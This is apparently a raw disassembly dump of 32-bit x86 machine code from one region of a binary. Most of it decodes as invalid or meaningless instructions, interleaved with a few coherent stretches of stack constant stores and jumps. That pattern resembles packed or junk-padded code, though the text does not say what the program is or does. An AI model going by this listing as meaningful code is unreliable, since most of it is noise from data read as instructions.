  40f505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f506:	sbb    dl,BYTE PTR ds:0x27d9a5c0
  40f50c:	hlt    
  40f50d:	pop    es
  40f50e:	jmp    0x40f4e2
  40f510:	push   ebx
  40f511:	addr16 sbb esp,ebx
  40f514:	fidivr WORD PTR [di]
  40f517:	add    BYTE PTR [edx+0x5f],dl
  40f51a:	xchg   edi,eax
  40f51b:	dec    edi
  40f51c:	sbb    DWORD PTR [esi],edi
  40f51e:	hlt    
  40f51f:	out    0x33,al
  40f521:	jae    0x40f56d
  40f523:	and    dh,al
  40f525:	outs   dx,DWORD PTR ds:[esi]
  40f526:	dec    ebx
  40f527:	das    
  40f528:	pop    es
  40f529:	sub    DWORD PTR [esi+0x3c],esi
  40f52c:	mov    dh,0x4f
  40f52e:	(bad)  
  40f52f:	push   edi
  40f530:	mov    ?,edx
  40f532:	cmp    bl,BYTE PTR [ebx]
  40f534:	push   es
  40f535:	arpl   WORD PTR [edx-0x1a4c7bdc],si
  40f53b:	imul   esi,DWORD PTR [eax+0x5feb4745],0x25
  40f542:	lahf   
  40f543:	loope  0x40f5bb
  40f545:	xchg   eax,esi
  40f547:	and    bh,BYTE PTR [ecx+ebp*1+0x792dc0e6]
  40f54e:	lods   al,BYTE PTR ds:[esi]
  40f54f:	fidiv  DWORD PTR [edx]
  40f551:	stc    
  40f552:	je     0x40f529
  40f554:	(bad)  
  40f556:	outs   dx,DWORD PTR ds:[esi]
  40f557:	pop    edx
  40f558:	retf   
  40f559:	cld    
  40f55a:	jg     0x40f561
  40f55c:	lock ret 
  40f55e:	push   0x1fe442d0
  40f563:	lds    esi,FWORD PTR [ecx]
  40f565:	int3   
  40f566:	cld    
  40f567:	out    dx,eax
  40f568:	into   
  40f569:	lods   eax,DWORD PTR ds:[esi]
  40f56a:	ficom  WORD PTR [ecx+0x34304678]
  40f570:	popf   
  40f571:	xor    BYTE PTR [esi],dh
  40f573:	leave  
  40f574:	jl     0x40f51a
  40f576:	pop    ebx
  40f577:	sbb    ebp,DWORD PTR [edi+eax*2-0x6eb4b8b2]
  40f57e:	dec    ebx
  40f57f:	inc    esp
  40f580:	inc    esi
  40f581:	out    dx,al
  40f582:	sub    eax,0x9ab1bbae
  40f587:	or     ebx,0x41b4b6f6
  40f58d:	cmp    al,0xee
  40f58f:	mov    DWORD PTR [edi-0xa4c1ecc],edi
  40f595:	sar    DWORD PTR [ecx+ecx*1-0x33],0xe2
  40f59a:	pop    esi
  40f59b:	leave  
  40f59c:	inc    ebx
  40f59d:	push   edi
  40f59e:	mov    DWORD PTR [ebp-0x58],0x3082
  40f5a5:	mov    DWORD PTR [ebp-0x54],0x37a2
  40f5ac:	mov    DWORD PTR [ebp-0x50],0x49d6
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	jmp    0x40f611
  40f661:	and    al,0x9e
  40f663:	pop    eax
  40f664:	push   ds
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0x8b50afa0
  40f66f:	shl    DWORD PTR [ebx],cl
  40f671:	rcl    BYTE PTR [ebx+edi*4-0xd61b30e],0x8b
  40f679:	push   ebp
  40f67a:	and    esp,eax
  40f67c:	outs   dx,DWORD PTR ds:[esi]
  40f67d:	loopne 0x40f681
  40f67f:	pusha  
  40f680:	cmp    dl,dh
  40f682:	adc    eax,0x573ab68d
  40f687:	mov    esp,0x2b0e58a2
  40f68c:	in     al,0x1
  40f68e:	push   cs
  40f68f:	cdq    
  40f690:	stos   DWORD PTR es:[edi],eax
  40f691:	shr    DWORD PTR [ecx+0x5b],0x79
  40f695:	pop    ss
  40f696:	add    eax,0x14119754
  40f69b:	mov    ds:0xe482050d,eax
  40f6a0:	pop    eax
  40f6a1:	clc    
  40f6a2:	fist   DWORD PTR [eax]
  40f6a4:	fs or  al,0x80
  40f6a7:	sahf   
  40f6a8:	jp     0x40f70f
  40f6aa:	ds push ebx
  40f6ac:	and    BYTE PTR [esi+0x46fc82de],bl
  40f6b2:	out    dx,eax
  40f6b3:	xchg   ebp,eax
  40f6b4:	pop    ebp
  40f6b5:	dec    edx
  40f6b6:	inc    esp
  40f6b7:	sti    
  40f6b8:	retf   0x6869
  40f6bb:	rol    BYTE PTR [eax],1
  40f6bd:	std    
  40f6be:	jmp    0x1f0d:0x8ca7f262
  40f6c5:	dec    esp
  40f6c6:	mov    ecx,0x64fbf49f
  40f6cb:	ror    BYTE PTR [esp+ecx*8-0x7cb06a43],0xc9
  40f6d3:	mov    ebx,0x3c7befb2
  40f6d8:	xchg   esi,eax
  40f6d9:	std    
  40f6da:	sbb    al,BYTE PTR [edx+0x5b]
  40f6dd:	rcr    al,0x8
  40f6e0:	div    BYTE PTR [ecx-0x1c8b5e60]
  40f6e6:	push   es
  40f6e7:	lea    ebx,[edi+eax*1]
  40f6ea:	popa   
  40f6eb:	cdq    
  40f6ec:	dec    esi
  40f6ed:	lods   eax,DWORD PTR ds:[esi]
  40f6ee:	stos   BYTE PTR es:[edi],al
  40f6ef:	leave  
  40f6f0:	or     ebx,edi
  40f6f2:	sti    
  40f6f3:	push   0x28
  40f6f5:	in     al,0x9
  40f6f7:	sbb    bh,BYTE PTR [edx]
  40f6f9:	enter  0x1017,0x3f
  40f6fd:	and    al,0x26
  40f6ff:	cmp    eax,0x397dd1be
  40f704:	pop    eax
  40f705:	dec    edx
  40f706:	sahf   
  40f707:	fwait
  40f708:	leave  
  40f709:	push   cs
  40f70a:	push   esi
  40f70b:	inc    edx
  40f70c:	aas    
  40f70d:	mov    edi,0xf45e9203
  40f712:	mov    dl,0x14
  40f714:	rcl    DWORD PTR ds:0xd974268f,1
  40f71a:	outs   dx,BYTE PTR ds:[esi]
  40f71b:	out    0xa9,al
  40f71d:	mov    al,ds:0x6b000abc
  40f722:	sbb    edx,DWORD PTR [edx+0x63]
  40f725:	jbe    0x40f727
  40f727:	cmp    eax,0x149d564b
  40f72c:	dec    edx
  40f72d:	aaa    
  40f72e:	mov    edi,DWORD PTR [eax]
  40f730:	(bad)
  40f734:	sbb    ch,0xac
  40f737:	or     DWORD PTR [edi+0x469c6ecf],edx
  40f73d:	shl    BYTE PTR [ecx+esi*8+0x3d],1
  40f741:	je     0x40f6f3
  40f743:	mov    ds:0xdadf7468,al
  40f748:	out    0x6c,al
  40f74a:	mov    ds:0xc2a2d8da,al
  40f74f:	mov    cl,0xbd
  40f751:	push   0xee1df698
  40f756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f757:	push   ebp
  40f758:	xor    eax,0xccb0cf5
  40f75d:	and    DWORD PTR [ecx-0x159ceace],edi
  40f763:	not    ecx
  40f765:	ins    BYTE PTR es:[edi],dx
  40f766:	sbb    eax,0xa932d97
  40f76b:	adc    BYTE PTR [edx-0x31577106],bl
  40f771:	fld    TBYTE PTR [ebp+0x51]
  40f774:	add    DWORD PTR [esi+0x59],edx
  40f777:	push   esi
  40f778:	scas   eax,DWORD PTR es:[edi]
  40f779:	adc    eax,0xca2efe1b
  40f77e:	out    dx,al
  40f77f:	outs   dx,DWORD PTR ds:[esi]
  40f780:	fst    QWORD PTR [edx-0x72]
  40f783:	popaw  
  40f785:	fs gs pushf 
  40f788:	lea    eax,[edi-0x6b]
  40f78b:	mov    eax,ds:0x3d4a6eca
  40f790:	sbb    BYTE PTR [esp+eax*4+0x36],bl
  40f794:	dec    ebp
  40f795:	inc    edi
  40f796:	fmulp  st(5),st
  40f798:	fs inc esp
  40f79a:	sbb    bl,BYTE PTR [ecx-0x20]
  40f79d:	sub    DWORD PTR [eax+0x0],ebx
  40f7a0:	add    DWORD PTR [edi+0x57b82303],eax
  40f7a6:	xor    ebp,eax
  40f7a8:	sub    DWORD PTR [edx+0x46c2ac4d],esp
  40f7ae:	(bad)  
  40f7af:	mov    ebp,0x588ae0a6
  40f7b4:	test   BYTE PTR [edx],cl
  40f7b6:	ret    
  40f7b7:	pop    ebx
  40f7b8:	inc    esp
  40f7b9:	pop    ecx
  40f7ba:	scas   eax,DWORD PTR es:[edi]
  40f7bb:	ds rcr esp,cl
  40f7be:	adc    ebx,DWORD PTR [ebx-0x1255b01]
  40f7c4:	sahf   
  40f7c5:	(bad)  
  40f7c6:	loope  0x40f83d
  40f7c8:	xchg   esi,eax
  40f7c9:	pop    edx
  40f7ca:	sub    edx,DWORD PTR ds:0x1b2c98bc
  40f7d0:	into   
  40f7d1:	lock or ebp,DWORD PTR [edx+eax*8-0x6d]
  40f7d6:	imul   esp,DWORD PTR [edx+0x468cec28],0x13
  40f7dd:	mov    BYTE PTR [eax+0x1a],bl
  40f7e0:	inc    eax
  40f7e1:	inc    esp
  40f7e2:	and    eax,0xf49fbed2
  40f7e7:	in     eax,0x60
  40f7e9:	push   es
  40f7ea:	(bad)  
  40f7eb:	fidivr DWORD PTR [edi+0x1]
  40f7ee:	add    BYTE PTR [edi],cl
  40f7f0:	xchg   BYTE PTR [edi],ah
  40f7f2:	lock imul eax,esi,0xd887a37a
  40f7f9:	xor    eax,0xe2dfe1d1
  40f7fe:	lds    esi,FWORD PTR [ecx]
  40f800:	or     eax,0x5976cefa
  40f805:	out    0x2c,eax
  40f807:	js     0x40f847
  40f809:	dec    eax
  40f80a:	jecxz  0x40f827
  40f80c:	(bad)  
  40f80d:	cmp    al,0xa2
  40f80f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f810:	out    dx,eax
  40f811:	aaa    
  40f812:	or     al,0xa0
  40f814:	push   0x11d80003
  40f819:	xor    al,0x1c
  40f81b:	imul   edx,ecx,0xffffffc4
  40f81e:	inc    edx
  40f81f:	aaa    
  40f820:	pop    ecx
  40f821:	inc    esp
  40f822:	mov    edi,0x92f7db25
  40f827:	mov    eax,ds:0x35471291
  40f82c:	rcl    DWORD PTR [eax+ebx*1-0x54],1
  40f830:	pop    ebx
  40f831:	scas   eax,DWORD PTR es:[edi]
  40f832:	out    0x78,eax
  40f834:	(bad)  
  40f838:	sbb    eax,ebp
  40f83a:	cmc    
  40f83b:	pop    eax
  40f83c:	ret    0xc8da
  40f83f:	lods   al,BYTE PTR ds:[esi]
  40f840:	loope  0x40f85a
  40f842:	jp     0x40f820
  40f844:	xchg   esp,eax
  40f845:	mov    al,0x71
  40f847:	or     BYTE PTR [esi],bl
  40f849:	les    ecx,FWORD PTR [edi]
  40f84b:	and    al,0x83
  40f84d:	pop    ebp
  40f84e:	mov    ah,dl
  40f850:	adc    eax,0x55293654
  40f855:	mov    ecx,0x109b072
  40f85a:	and    al,BYTE PTR [edx-0x3feb4a5c]
  40f860:	fwait
  40f861:	xchg   esp,eax
  40f862:	adc    eax,0xb0a6630b
  40f867:	jne    0x40f857
  40f869:	call   0x45c935e
  40f86e:	mul    BYTE PTR [edx-0x28]
  40f871:	idiv   BYTE PTR [esi]
  40f873:	inc    ebx
  40f874:	dec    esi
  40f875:	stos   BYTE PTR es:[edi],al
  40f876:	test   DWORD PTR [ecx-0x18],edx
  40f879:	retf   
  40f87a:	sbb    eax,0x602c6ea6
  40f87f:	push   esp
  40f880:	popf   
  40f881:	shr    BYTE PTR [eax],0xc8
  40f884:	shl    al,cl
  40f886:	leave  
  40f887:	xchg   ebx,eax
  40f888:	mov    ah,0x90
  40f88a:	jns    0x40f861
  40f88c:	cmp    al,BYTE PTR [eax+esi*2+0x1441570b]
  40f893:	add    eax,0x2f0e4976
  40f898:	mov    ds:0x4381114c,al
  40f89d:	iret   
  40f89e:	ins    DWORD PTR es:[edi],dx
  40f89f:	pop    eax
  40f8a0:	xor    BYTE PTR [esi-0x14e0d12b],0x77
  40f8a7:	retf   0x9fca
  40f8aa:	je     0x40f904
  40f8ac:	mov    ebx,0x1cc03486
  40f8b1:	(bad)  
  40f8b2:	sbb    BYTE PTR [eax+0x24],ah
  40f8b5:	inc    edx
  40f8b6:	out    0x30,eax
  40f8b8:	pop    ebx
  40f8b9:	and    ch,bl
  40f8bb:	fistp  WORD PTR [ebp+0x8]
  40f8be:	mov    edi,0xbfa5c155
  40f8c3:	(bad)  
  40f8c4:	jp     0x40f8b7
  40f8c6:	inc    edi
  40f8c7:	adc    eax,0xa3084bce
  40f8cc:	inc    ecx
  40f8cd:	adc    edx,eax
  40f8cf:	mov    ch,0x22
  40f8d1:	leave  
  40f8d2:	ja     0x40f878
  40f8d4:	sub    ecx,DWORD PTR [edx+0x55]
  40f8d7:	aam    0x6f
  40f8d9:	dec    edi
  40f8da:	jae    0x40f945
  40f8dc:	and    eax,0x5ba0fb07
  40f8e1:	cmp    eax,0xe304b351
  40f8e6:	lods   eax,DWORD PTR ds:[esi]
  40f8e7:	and    eax,0x593d0756
  40f8ec:	stos   DWORD PTR es:[edi],eax
  40f8ed:	dec    esi
  40f8ee:	pop    edx
  40f8ef:	mov    bh,0xdb
  40f8f1:	pop    ebp
  40f8f2:	stos   DWORD PTR es:[edi],eax
  40f8f3:	add    ebp,ebp
  40f8f5:	xchg   DWORD PTR [esi],ebx
  40f8f7:	mov    ecx,DWORD PTR [ecx+ecx*2+0xa]
  40f8fb:	stc    
  40f8fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8fd:	sub    al,0x43
  40f8ff:	mov    dl,0x6e
  40f901:	ss into 
  40f903:	sub    dh,BYTE PTR [edi-0x8138a1]
  40f909:	adc    eax,0x3ee090c7
  40f90e:	push   es
  40f90f:	push   edi
  40f910:	mov    BYTE PTR [ebp+0x4ac49b19],bl
  40f916:	fmul   QWORD PTR [eax]
  40f918:	xchg   BYTE PTR [edi-0x2bd2cf42],al
  40f91e:	outs   dx,BYTE PTR ds:[esi]
  40f91f:	adc    dh,cl
  40f921:	xchg   DWORD PTR [ebx+edi*4],esi
  40f924:	mov    BYTE PTR [ebp+ecx*4-0x50],cl
  40f928:	and    esi,ecx
  40f92a:	sbb    DWORD PTR [ebx+0x2dab404f],0xffffff84
  40f931:	ficomp DWORD PTR [esi-0x38627990]
  40f937:	ds push eax
  40f939:	mov    esp,DWORD PTR [ecx-0x14]
  40f93c:	pop    eax
  40f93d:	mov    bl,0xe2
  40f93f:	scas   eax,DWORD PTR es:[edi]
  40f940:	xchg   esp,eax
  40f941:	inc    esi
  40f942:	xchg   esi,eax
  40f943:	cmp    eax,0x92ff669a
  40f948:	mov    al,0xeb
  40f94a:	adc    esp,esi
  40f94c:	dec    edi
  40f94d:	int3   
  40f94e:	shl    ebp,1
  40f950:	push   edi
  40f951:	aam    0x1
  40f953:	dec    edx
  40f954:	in     al,0x15
  40f956:	push   ebp
  40f957:	sti    
  40f958:	dec    eax
  40f959:	repz mov ah,0xc8
  40f95c:	jmp    0x2c7a5d7d
  40f961:	jno    0x40f932
  40f963:	jl     0x40f97e
  40f965:	mov    esi,0x513f151f
  40f96a:	lea    esp,[esi-0x25]
  40f96d:	(bad)
  40f970:	inc    edi
  40f971:	ffree  st(4)
  40f973:	adc    eax,DWORD PTR [edx+0x4624550d]
  40f979:	and    ebp,DWORD PTR [edi+0x35]
  40f97c:	test   al,0x74
  40f97e:	add    ebx,DWORD PTR [ebx]
  40f980:	pop    edi
  40f981:	add    esi,edi
  40f983:	ins    BYTE PTR es:[edi],dx
  40f984:	and    edi,DWORD PTR [ebp-0x34]
  40f987:	mov    edx,0x6e2c5f24
  40f98c:	test   al,0xca
  40f98e:	dec    esp
  40f98f:	and    DWORD PTR ds:0xed8e8094,ebp
  40f995:	pop    edi
  40f996:	gs pop ebx
  40f998:	ins    BYTE PTR es:[edi],dx
  40f999:	dec    edi
  40f99a:	and    ebp,eax
  40f99c:	mov    al,ds:0x893c23a5
  40f9a1:	xchg   BYTE PTR [ecx],bh
  40f9a3:	pop    ebp
  40f9a4:	sub    edx,DWORD PTR [edi-0x5b]
  40f9a7:	adc    bh,ch
  40f9a9:	sti    
  40f9aa:	std    
  40f9ab:	push   ebx
  40f9ac:	jmp    0x40fa0d
  40f9ae:	icebp  
  40f9af:	sub    DWORD PTR [edi+ebp*8+0x65da9d46],esp
  40f9b6:	js     0x40f94a
  40f9b8:	inc    esi
  40f9b9:	sub    bl,BYTE PTR [ebx-0x54]
  40f9bc:	jg     0x40f976
  40f9be:	mov    ch,0xf
  40f9c0:	pop    DWORD PTR ds:0x8b316a5e
  40f9c6:	pushf  
  40f9c7:	iret   
  40f9c8:	mov    bh,0x4e
  40f9ca:	pop    edi
  40f9cb:	or     bl,cl
  40f9cd:	aam    0xcf
  40f9cf:	fmul   QWORD PTR [ebx+0x5f]
  40f9d2:	or     BYTE PTR [esp+ecx*4-0x73],dl
  40f9d6:	leave  
  40f9d7:	pusha  
  40f9d8:	push   esi
  40f9d9:	and    BYTE PTR ds:0x99bf5c82,0xee
  40f9e0:	cmp    bh,BYTE PTR [ebx]
  40f9e2:	(bad)  
  40f9e3:	jl     0x40f978
  40f9e5:	outs   dx,BYTE PTR ds:[esi]
  40f9e6:	out    dx,al
  40f9e7:	(bad)  
  40f9e8:	repz mov edx,0xdeebe89c
  40f9ee:	dec    ecx
  40f9ef:	jl     0x40fa19
  40f9f1:	aas    
  40f9f2:	sbb    ecx,eax
  40f9f4:	loope  0x40f979
  40f9f6:	adc    eax,0x9a0c4534
  40f9fb:	call   0x7140a5d1
  40fa00:	xchg   edi,eax
  40fa01:	stos   DWORD PTR es:[edi],eax
  40fa02:	mov    ecx,DWORD PTR [ebp-0x4]
  40fa05:	mov    edx,DWORD PTR [ebp-0x10]
  40fa08:	mov    edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x4222a7
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	enter  0xf08e,0xcf
  40fa49:	jge    0x40fa71
  40fa4b:	mov    esi,0xbec4e3be
  40fa50:	mov    esi,0xc37f3b2e
  40fa55:	sbb    ecx,DWORD PTR [eax]
  40fa57:	fstp   TBYTE PTR [esi+ebp*4+0x14]
  40fa5b:	mov    ebp,0x2ca4490b
  40fa60:	mov    DWORD PTR [ebx-0x34],edx
  40fa63:	dec    eax
  40fa64:	cmp    al,0xe3
  40fa66:	adc    dh,cl
  40fa68:	test   BYTE PTR [edx-0x64],dh
  40fa6b:	jb     0x40fa34
  40fa6d:	pop    edi
  40fa6e:	fistp  DWORD PTR [edi-0x59fcfa5e]
  40fa74:	jl     0x40faef
  40fa76:	sub    eax,0xb66bb370
  40fa7b:	cwde   
  40fa7c:	test   eax,0x1233a22b
  40fa81:	adc    DWORD PTR [edx+0x55fbdb16],0x42
  40fa88:	push   ds
  40fa89:	pusha  
  40fa8a:	aad    0x1b
  40fa8c:	mov    ebp,0xc00f65b
  40fa91:	adc    al,0x29
  40fa93:	enter  0xbcdd,0x80
  40fa97:	in     eax,dx
  40fa98:	std    
  40fa99:	lds    ecx,FWORD PTR [edx+0x29e8a9a3]
  40fa9f:	sub    BYTE PTR [ecx+0xc],ch
  40faa2:	inc    esi
  40faa3:	cli    
  40faa4:	sbb    DWORD PTR [esi],ebp
  40faa6:	lds    edi,FWORD PTR [edx-0x7032d831]
  40faac:	mov    edi,0x1f555f01
  40fab1:	call   0x306cff86
  40fab6:	jbe    0x40fb05
  40fab8:	cmp    BYTE PTR [ebx-0x42f1b5d2],al
  40fabe:	inc    ecx
  40fabf:	lea    edx,[esi+0x34]
  40fac2:	in     al,dx
  40fac3:	sahf   
  40fac4:	lahf   
  40fac5:	fcom   QWORD PTR [ebx+0x2f3c77d2]
  40facb:	cmp    edi,ebx
  40facd:	pop    ebp
  40face:	mov    eax,0x37ea986b
  40fad3:	ins    DWORD PTR es:[edi],dx
  40fad4:	in     al,dx
  40fad5:	(bad)  
  40fad6:	int3   
  40fad7:	mov    eax,ds:0x8ee53eda
  40fadc:	inc    ecx
  40fadd:	mov    ecx,0x7ea46b44
  40fae2:	pop    edx
  40fae3:	sub    eax,0xf6a7e89c
  40fae8:	add    dh,BYTE PTR [ebx+ebx*8-0x4c]
  40faec:	push   ebp
  40faed:	push   cs
  40faee:	cmc    
  40faef:	mov    DWORD PTR [edi],ecx
  40faf1:	xchg   edx,eax
  40faf2:	sbb    BYTE PTR [edx-0x32],bl
  40faf5:	xchg   BYTE PTR [ebx+0x72bc274d],ah
  40fafb:	mov    eax,0x79f0a7ff
  40fb00:	jbe    0x40fad9
  40fb02:	pop    edx
  40fb03:	xchg   ebx,eax
  40fb04:	pushf  
  40fb05:	sbb    DWORD PTR [edi],esi
  40fb07:	mov    ebx,0x343e5a6
  40fb0c:	mov    eax,ds:0xb2a3433e
  40fb11:	xor    BYTE PTR [eax+0x2e],dl
  40fb14:	jge    0x40fab2
  40fb16:	ret    
  40fb17:	loope  0x40fab7
  40fb19:	fcompp 
  40fb1b:	jae    0x40fb38
  40fb1d:	in     eax,0x7a
  40fb1f:	mov    ecx,0x2034a9f2
  40fb24:	adc    esi,DWORD PTR [ebp-0x244fde75]
  40fb2a:	repnz push ecx
  40fb2c:	outs   dx,DWORD PTR ds:[esi]
  40fb2d:	xchg   ebx,eax
  40fb2e:	mov    edi,0xf44e953c
  40fb33:	mov    ecx,eax
  40fb35:	and    BYTE PTR [edi-0x54],bl
  40fb38:	out    0x5d,al
  40fb3a:	cmp    eax,0xf7d6b4bf
  40fb3f:	leave  
  40fb40:	and    eax,0x76f428ef
  40fb45:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40fb47:	pop    edi
  40fb48:	fild   WORD PTR [edx+edx*4-0x4d]
  40fb4d:	out    0xbe,eax
  40fb4f:	imul   esi,ebx,0xb18f327a
  40fb55:	in     eax,dx
  40fb56:	xor    edi,eax
  40fb58:	leave  
  40fb59:	mov    bh,0x6a
  40fb5b:	loopne 0x40fbb9
  40fb5d:	leave  
  40fb5e:	fs imul edi,ebx,0xb951958
  40fb65:	repnz mov eax,ds:0xd81dd6c5
  40fb6b:	rcl    BYTE PTR ds:0x86e6244c,cl
  40fb71:	outs   dx,BYTE PTR ds:[esi]
  40fb72:	test   al,0xf5
  40fb74:	in     eax,0xf3
  40fb76:	(bad)  
  40fb78:	mov    dl,0xcf
  40fb7a:	call   0x3df3:0xed3f989c
  40fb81:	out    dx,eax
  40fb82:	das    
  40fb83:	inc    ebx
  40fb84:	gs in  eax,dx
  40fb86:	in     eax,dx
  40fb87:	pop    eax
  40fb88:	mov    bl,0x77
  40fb8a:	iret   
  40fb8b:	fild   WORD PTR [edi-0x164d513f]
  40fb91:	aad    0x32
  40fb93:	xor    al,0x13
  40fb95:	sahf   
  40fb96:	push   esp
  40fb97:	(bad)  
  40fb99:	dec    esp
  40fb9a:	sub    DWORD PTR [edi+0x381e3720],0x2e
  40fba1:	xchg   DWORD PTR [esi],esi
  40fba3:	adc    DWORD PTR [edx],edx
  40fba5:	cmovo  esi,DWORD PTR [edi-0x27]
  40fba9:	mov    edx,0x2c19f0dc
  40fbae:	pushf  
  40fbaf:	jmp    0x40fc0c
  40fbb1:	xchg   ebx,eax
  40fbb2:	int    0xd5
  40fbb4:	mov    ebx,0xb91dad01
  40fbb9:	out    dx,eax
  40fbba:	xor    BYTE PTR [esi+esi*4],ah
  40fbbd:	inc    ebp
  40fbbe:	call   0xb02f:0x761ea4a8
  40fbc5:	sbb    BYTE PTR [eax-0x4a],ah
  40fbc8:	sbb    ebx,DWORD PTR [esi+0x1b]
  40fbcb:	mov    ch,0x47
  40fbcd:	stos   DWORD PTR es:[edi],eax
  40fbce:	xchg   ecx,eax
  40fbcf:	add    ecx,edi
  40fbd1:	jmp    0xa4be:0x5192ce4b
  40fbd8:	or     edx,DWORD PTR [edx+0x5d3ca62a]
  40fbde:	push   ebp
  40fbdf:	out    dx,al
  40fbe0:	dec    eax
  40fbe1:	sub    cl,BYTE PTR [eax+edx*1-0x7636027d]
  40fbe8:	cmc    
  40fbe9:	xchg   BYTE PTR [edi],dl
  40fbeb:	jecxz  0x40fbfb
  40fbed:	arpl   WORD PTR [esi-0x56],ax
  40fbf0:	stos   DWORD PTR es:[edi],eax
  40fbf1:	lea    ecx,[ecx]
  40fbf3:	cmp    al,0x70
  40fbf5:	cmp    al,0xf3
  40fbf7:	mov    ebx,DWORD PTR [edi-0x4d]
  40fbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbfb:	xchg   BYTE PTR [edx],dh
  40fbfd:	and    BYTE PTR [ebx],al
  40fbff:	test   BYTE PTR [esp+edx*4+0x7b],ah
  40fc03:	loop   0x40fc81
  40fc05:	std    
  40fc06:	clc    
  40fc07:	xchg   DWORD PTR [ebp-0x20],edx
  40fc0a:	adc    al,0x67
  40fc0c:	dec    esp
  40fc0d:	addr16 pop esp
  40fc0f:	(bad)  
  40fc10:	(bad)  
  40fc11:	and    BYTE PTR ds:0xd2d005d4,al
  40fc17:	xchg   DWORD PTR [ebx],esi
  40fc19:	retf   0xeec5
  40fc1c:	test   al,0xfb
  40fc1e:	push   edx
  40fc1f:	(bad)  
  40fc20:	ins    BYTE PTR es:[edi],dx
  40fc21:	sbb    DWORD PTR [ebx],eax
  40fc23:	cmp    cl,bl
  40fc25:	cdq    
  40fc26:	push   edi
  40fc27:	cld    
  40fc28:	aaa    
  40fc29:	ret    0xb7e4
  40fc2c:	aam    0xeb
  40fc2e:	and    edi,ebx
  40fc30:	loope  0x40fc39
  40fc32:	test   BYTE PTR [edi+0x1],cl
  40fc35:	push   eax
  40fc36:	xchg   BYTE PTR cs:[edi+0x3a17f9ae],ch
  40fc3d:	call   0x99c55ddb
  40fc42:	out    dx,al
  40fc43:	jne    0x40fc90
  40fc45:	inc    eax
  40fc46:	test   eax,0xcc353b23
  40fc4b:	cli    
  40fc4c:	in     al,dx
  40fc4d:	sub    dl,BYTE PTR [ecx-0x51]
  40fc50:	sbb    BYTE PTR [eax+ecx*8],dh
  40fc53:	ret    0x9690
  40fc56:	sub    ebp,DWORD PTR [esi]
  40fc58:	ins    DWORD PTR es:[edi],dx
  40fc59:	cwde   
  40fc5a:	stc    
  40fc5b:	out    dx,al
  40fc5c:	dec    ebp
  40fc5d:	pop    es
  40fc5e:	das    
  40fc5f:	xor    BYTE PTR [ecx+eiz*1],0x2e
  40fc63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc64:	jo     0x40fc72
  40fc66:	pusha  
  40fc67:	mov    BYTE PTR [ecx+0x2eb87deb],ch
  40fc6d:	add    DWORD PTR [ecx-0x53],0x39
  40fc71:	inc    edi
  40fc72:	stos   BYTE PTR es:[edi],al
  40fc73:	shl    DWORD PTR ds:0x958435e6,1
  40fc79:	test   DWORD PTR [eax+0x7f],ebx
  40fc7c:	mov    eax,ds:0xe130fa31
  40fc81:	xchg   edx,eax
  40fc82:	sub    eax,edx
  40fc84:	popa   
  40fc85:	mov    ebp,0xc5521048
  40fc8a:	and    ebx,DWORD PTR [esi]
  40fc8c:	fdiv   DWORD PTR [eax+eiz*4+0x1287f4af]
  40fc93:	jge    0x40fcf5
  40fc95:	or     BYTE PTR [ebx-0xd963faa],al
  40fc9b:	inc    edi
  40fc9c:	lea    ebp,[edi-0xf32e5d3]
  40fca2:	xlat   BYTE PTR ds:[ebx]
  40fca3:	cmp    eax,ecx
